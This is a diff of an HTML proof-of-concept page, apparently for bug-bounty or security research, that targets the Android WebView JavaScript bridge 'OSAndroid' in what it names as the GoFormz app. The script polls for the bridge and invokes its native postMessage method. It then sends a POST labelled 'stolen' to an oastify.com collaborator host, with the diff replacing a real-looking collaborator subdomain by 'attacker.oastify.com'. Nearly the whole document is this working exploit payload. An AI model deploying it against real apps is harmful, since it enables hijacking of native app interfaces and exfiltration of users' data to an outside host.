@@ -1,31 +1,35 @@
 <!DOCTYPE html>
 <html>
   <head>
-    <title>XSS RCE PoC</title>
+    <title>GoFormz WebView PoC</title>
     <script>
       let attempts = 0;
-      const maxAttempts = 30;
+      const maxAttempts = 20;
 
       const interval = setInterval(() => {
         attempts++;
         if (window.OSAndroid && typeof OSAndroid.postMessage === 'function') {
           clearInterval(interval);
-          // Call native postMessage
+
+          // Tell the app the view is ready
           OSAndroid.postMessage(JSON.stringify({ type: "rendering_complete" }));
 
-          // Send data to collaborator
-          fetch("https://0fgo4lgo69nq5yo8he9arf5uqlwck78w.oastify.com", {
+          // Now send data to collaborator
+          fetch("https://attacker.oastify.com", {
             method: "POST",
-            body: JSON.stringify({ leak: "PoC reached" }),
+            body: JSON.stringify({ stolen: "XSS executed successfully" }),
           });
-        } else if (attempts > maxAttempts) {
+        }
+
+        if (attempts > maxAttempts) {
           clearInterval(interval);
-          alert("OSAndroid interface not available.");
+          alert("Timed out waiting for OSAndroid interface");
         }
       }, 500);
     </script>
   </head>
   <body>
-    <h1>Loading payload...</h1>
+    <h1>Loading...</h1>
   </body>
 </html>
+
